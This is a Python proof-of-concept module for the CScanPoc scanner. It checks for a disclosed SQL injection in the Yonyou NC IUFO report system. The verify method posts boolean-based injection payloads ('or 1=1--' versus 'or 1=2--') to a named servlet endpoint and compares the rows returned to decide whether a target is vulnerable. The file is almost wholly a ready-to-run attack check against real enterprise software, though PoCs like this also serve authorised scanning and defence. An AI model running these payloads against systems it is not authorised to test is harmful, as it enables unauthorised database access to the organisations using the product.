# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re


class Vuln(ABVuln):
    vuln_id = 'Yonyou_0021'  # 平台漏洞编号，留空
    name = '用友NC-IUFO报表系统 SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-05-16'  # 漏洞公布时间
    desc = '''
        用友是国内著名的内容管理系统之一，包括协同管理系统、用友NC、用友U8等
        用友NC-集团报表为集团企业用户提供全面的报表解决方案，它主要支持各类业务报表的输出、合并报表编制、分部报告编制以及报表的权限与流程管理，客户涉及金融、政府、教育、企业等
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=060988'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Yonyou(用友)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '7f52aead-734e-426c-b530-073ecab0626d'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-14'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))

            # Refer:http://www.wooyun.org/bugs/wooyun-2014-060988
            hh = hackhttp.hackhttp()
            url = self.target + "/service/~iufo/com.ufida.web.action.ActionServlet?RefTargetId=m_strUnitCode&onlyTwo=false&param_orgpk=level_code&retType=unit_code&Operation=Search&action=nc.ui.iufo.web.reference.base.UnitTableRefAction&method=execute"
            payload1 = "TreeSelectedID=&TableSelectedID=&refSearchProp=unit_code&refSearchPropLbl=%E5%8D%95%E4%BD%8D%E7%BC%96%E7%A0%81&refSearchOper=%3D&refSearchOperLbl=%E7%AD%89%E4%BA%8E&refSearchValue=%27or+1%3D1--"
            code1, head1, res1, errcode1, _ = hh.http(url, post=payload1)

            payload2 = "TreeSelectedID=&TableSelectedID=&refSearchProp=unit_code&refSearchPropLbl=%E5%8D%95%E4%BD%8D%E7%BC%96%E7%A0%81&refSearchOper=%3D&refSearchOperLbl=%E7%AD%89%E4%BA%8E&refSearchValue=%27or+1%3D2--"
            code2, head2, res2, errcode2, _ = hh.http(url, post=payload2)

            if(code1 == 200 and code2 == 200):
                rm1 = re.findall("<tr\s*id='sortItem'", res1)
                rm2 = re.findall("<tr\s*id='sortItem'", res2)
                if (len(rm1) != len(rm2)):
                    #security_hole('sqlinject:POST [refSearchValue=>\'or 1=1]'+url)
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
